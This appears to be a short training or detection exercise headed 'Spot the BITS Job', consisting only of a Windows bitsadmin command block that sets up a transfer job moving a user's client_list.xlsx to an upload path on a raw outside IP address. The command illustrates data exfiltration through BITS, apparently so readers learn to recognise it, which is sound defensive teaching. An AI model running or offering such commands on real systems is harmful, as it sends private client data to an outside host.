## Spot the BITS Job

```cmd
bitsadmin /create datatransfer
bitsadmin /addfile datatransfer C:\Users\jsmith\Documents\client_list.xlsx http://185.220.101.47/upload/client_list.xlsx
bitsadmin /resume datatransfer
```
